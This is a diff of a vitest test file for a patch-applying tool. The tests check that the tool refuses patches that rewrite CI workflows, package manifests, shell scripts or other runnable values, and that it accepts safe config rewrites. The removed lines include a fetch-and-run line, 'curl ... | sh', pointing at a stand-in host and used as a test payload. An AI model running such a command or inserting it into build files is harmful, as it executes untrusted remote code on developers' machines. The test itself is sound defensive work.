@@ -6,6 +6,7 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { packRun, plain, recordBlame, recordRepair, Store, unifiedDiff, type RepairReport } from '@shadowlap/engine';
 import { fixDetail, patchesInTree, patchesToCheck, pulledPatchesToCheck, rewritesHere } from '@shadowlap/dashboard';
 import { AFTER, BEFORE, blameReport, EXPECT, makeRun, repairReport } from '../../engine/test/fix-fixtures.js';
+import { CONFIG_REWRITES, RUNNERS } from '../../engine/test/runner-fixtures.js';
 import { ApplyError, applyFix } from '../src/fix-apply.js';
 import { formatFixDetail } from '../src/fix-format.js';
 
@@ -406,27 +407,38 @@ async function refusal(store: Store, fix: ReturnType<typeof pulledRewrite>): Pro
 }
 
 describe("fix apply of a teammate's patch that rewrites more than text a repair rewrites", () => {
-  it('refuses one to a workflow, a package manifest or a shell script, and changes nothing', async () => {
+  it('refuses one to each runner, a file or a value that runs, with why, and changes nothing', async () => {
     const store = Store.open(join(project, 'shadowlap.db'));
     try {
-      const payload = 'curl -s https://example.com/x.sh | sh';
-      const cases = [
-        { id: 'repair-wf1', file: '.github/workflows/ci.yml', content: 'name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n', before: 'npm test', ext: 'yml' },
-        { id: 'repair-pk1', file: 'package.json', content: '{\n  "scripts": {\n    "test": "vitest run"\n  }\n}\n', before: 'vitest run', ext: 'json' },
-        { id: 'repair-sh1', file: 'scripts/release.sh', content: '#!/bin/sh\nnpm publish --dry-run\n', before: 'npm publish --dry-run', ext: 'sh' },
-      ];
-      for (const c of cases) {
-        const fix = pulledRewrite(store, c.id, c.file, c.content, c.before, `${c.before} && ${payload}`);
+      for (const [i, r] of RUNNERS.entries()) {
+        const id = `repair-run${i}`;
+        const fix = pulledRewrite(store, id, r.file, r.content, r.before, r.after);
         const { error, shown } = await refusal(store, fix);
-        expect(error, c.file).toBe(
-          `the patch ${c.id} holds is not the change it verified: its accepted candidate rewrites ${c.file}, a .${c.ext} file: a repair rewrites text only in a string of JavaScript, TypeScript or Python source, or in a Markdown, plain text, prompt or Jinja file. Nothing was changed: a repair only ever rewrites one span of one file, so read .shadowlap/repairs/${c.id}/fix.patch before you apply any of it by hand`,
-        );
-        expect(readFileSync(join(project, c.file), 'utf8'), c.file).toBe(c.content);
+        // One whose every text runs never comes with a pull: it is refused as the patch is read. A value
+        // that runs is told by the file as it is here.
+        const why = r.runs === 'file' ? `its accepted candidate rewrites ${r.file}, ${r.what}: a repair never rewrites a file that runs` : `here, the text its accepted candidate rewrites in ${r.file} is in ${r.what}: a repair never rewrites what runs`;
+        expect(error, r.file).toBe(`the patch ${id} holds is not the change it verified: ${why}. Nothing was changed: a repair only ever rewrites one span of one file, so read .shadowlap/repairs/${id}/fix.patch before you apply any of it by hand`);
+        expect(readFileSync(join(project, r.file), 'utf8'), r.file).toBe(r.content);
         expect(store.getFix(fix.fixId)!.status).toBe('verified');
-        expect(shown).toContain(`  ! its patch is not the change its repair verified: its accepted candidate rewrites ${c.file}, a .${c.ext} file`);
+        expect(shown, r.file).toContain(`  ! its patch is not the change its repair verified: ${why}. shadowlap fix apply won't apply it`);
         expect(shown).not.toContain('git apply');
       }
       expect(status()).toBe('');
+    } finally {
+      store.close();
+    }
+  });
+
+  it("puts in one that rewrites CrewAI's prompts, a config's model, or a value beside one that runs", async () => {
+    const store = Store.open(join(project, 'shadowlap.db'));
+    try {
+      // Each in a folder of its own, so a later one finds the file as it was committed.
+      for (const [i, r] of CONFIG_REWRITES.entries()) {
+        const file = `c${i}/${r.file}`;
+        const fix = pulledRewrite(store, `repair-cfg${i}`, file, r.content, r.before, r.after);
+        expect(await applyFix(store, fix, options([])), file).toMatchObject({ status: 'applied', patch: 'applied' });
+        expect(readFileSync(join(project, file), 'utf8'), file).toBe(r.content.replace(r.before, r.after));
+      }
     } finally {
       store.close();
     }
